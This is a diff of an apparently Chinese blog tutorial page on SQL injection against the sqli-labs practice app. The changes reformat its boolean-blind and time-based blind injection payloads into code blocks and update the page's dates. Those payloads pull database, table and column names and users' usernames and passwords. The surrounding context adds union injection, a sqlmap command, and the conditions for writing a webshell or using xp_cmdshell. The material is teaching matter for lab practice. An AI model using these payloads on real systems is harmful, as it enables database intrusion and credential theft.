@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241654803.png">
 <meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411241703198.png">
 <meta property="article:published_time" content="2024-11-24T17:12:33.000Z">
-<meta property="article:modified_time" content="2024-11-24T17:12:33.000Z">
+<meta property="article:modified_time" content="2026-01-20T20:38:50.000Z">
 <meta property="article:author" content="fogpost">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary_large_image">
@@ -318,7 +318,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2024-11-24T17:12:33+00:00
+                    本文最后更新于 2026-01-20T20:38:50+00:00
                   
                   
 
@@ -344,10 +344,25 @@
 <li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容<br>这个是手工注入的基本，大部分的注入都是围绕上面来优化的</li>
 </ol>
 <h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>sqlmap -u <a target="_blank" rel="noopener" href="http://sql/sqli-labs-master/Less-1/id=1">http://sql/sqli-labs-master/Less-1/id=1</a> –dbs 查看对应的库<br>之后还会专门出一个sqlmap的教程，这里就不多说了</p>
-<h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><p>?id&#x3D;1’and length((select database()))&gt;9–+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id&#x3D;1’and ascii(substr((select database()),1,1))&#x3D;115–+<br>#substr(“78909”,1,1)&#x3D;7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p>
-<p>?id&#x3D;1’and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13–+<br>判断所有表名字符长度。<br>?id&#x3D;1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+<br>逐一判断表名</p>
-<p>?id&#x3D;1’and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20–+<br>判断所有字段名的长度<br>?id&#x3D;1’and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99–+<br>逐一判断字段名。</p>
-<p>?id&#x3D;1’ and length((select group_concat(username,password) from users))&gt;109–+<br>判断字段内容长度<br>?id&#x3D;1’ and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50–+<br>逐一检测内容。</p>
+<h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and length((select database()))&gt;9--+</span><br></code></pre></td></tr></table></figure>
+<p>大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and ascii(substr((select database()),1,1))=115--+</span><br><span class="hljs-string">substr(&quot;78909&quot;,1,1)=7 </span><br><span class="hljs-string">substr(a,b,c)</span><br></code></pre></td></tr></table></figure>
+
+<p>a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span><br></code></pre></td></tr></table></figure>
+<p>判断所有表名字符长度。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+</span><br></code></pre></td></tr></table></figure>
+<p>逐一判断表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;))&gt;20--+</span><br></code></pre></td></tr></table></figure>
+
+<p>判断所有字段名的长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;),1,1))&gt;99--+</span><br></code></pre></td></tr></table></figure>
+<p>逐一判断字段名。</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span><br></code></pre></td></tr></table></figure>
+
+<p>判断字段内容长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></code></pre></td></tr></table></figure>
+<p>逐一检测内容。</p>
 <h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiayun1995/article/details/86512290">参考文献</a><br>在了解了bool盲注的基本原理之后我们发现一个问题，手工注入必然会导致时间过程，于是应运而生，我们的双查询注入可以帮助我们避免长时间的枯燥操作直接获取数据库的信息，在讲解之前我们要先了解几个函数</p>
 <h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>rand()：随机数函数 返回一个0到1的数<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241656811.png" srcset="/img/loading.gif" lazyload><br>floor()：向下取整，floor的向下取整可以帮我们进行去整处理，加入乘法便可以构建任意随机数选择<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241658373.png" srcset="/img/loading.gif" lazyload><br>concat()：字符串连接函数，用于连接我们查询到的数据<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241701358.png" srcset="/img/loading.gif" lazyload><br>group by：分组 as (_<em>别名)：给查询结果起别名(括号中为自定义的别名)<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241707695.png" srcset="/img/loading.gif" lazyload><br>count()：聚合函数<br>这里利用count(</em>)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241709101.png" srcset="/img/loading.gif" lazyload><br>我们这里需要的是第一次的报错，因为在实际过程中我们不可能查询到正确消息，只有在可能遇到错误时才会有返回值</p>
 <h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>子查询：内部查询，允许把另一个查询嵌套到当前的查询中</p>
@@ -364,11 +379,24 @@
 <li>ST_LatFromGeoHash((select * from(select * from(select user())a)b))</li>
 <li>GTID_SUBSET(version(), 1)</li>
 </ul>
-<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+<br>判断参数构造。<br>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+<br>判断数据库名长度</p>
-<p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+<br>逐一判断数据库字符<br>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+<br>判断所有表名长度</p>
-<p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+<br>逐一判断表名<br>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+<br>判断所有字段名的长度</p>
-<p>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+<br>逐一判断字段名。<br>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+<br>判断字段内容长度</p>
-<p>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+<br>逐一检测内容。</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(1=1,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>判断参数构造。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>判断数据库名长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>逐一判断数据库字符</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>判断所有表名长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>逐一判断表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;))&gt;20,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>判断所有字段名的长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>逐一判断字段名。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>判断字段内容长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure>
+<p>逐一检测内容。</p>
 <h1 id="通过sql来getshell"><a href="#通过sql来getshell" class="headerlink" title="通过sql来getshell"></a>通过sql来getshell</h1><h2 id="条件和原理"><a href="#条件和原理" class="headerlink" title="条件和原理"></a>条件和原理</h2><blockquote>
 <p>条件：<br> root权限<br> 知道网站根目录绝对路径<br> secure_file_priv为空或指定目录（@@secure_file_priv参数可以其值）<br> gpc关闭<br>原理：<br> 写入webshell，通过参数执行系统命令，结束后删除webshell<br>附：sqlserver getshell条件和原理<br> 条件：<br>  支持外连<br>  有sa权限<br> 原理：<br>  开启xp_cmd扩展执行系统命令  </p>
 </blockquote>
@@ -447,6 +475,11 @@
           <div>2024年11月24日</div>
         </div>
       
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年1月20日</div>
+        </div>
       
       
         <div class="license-meta-item">
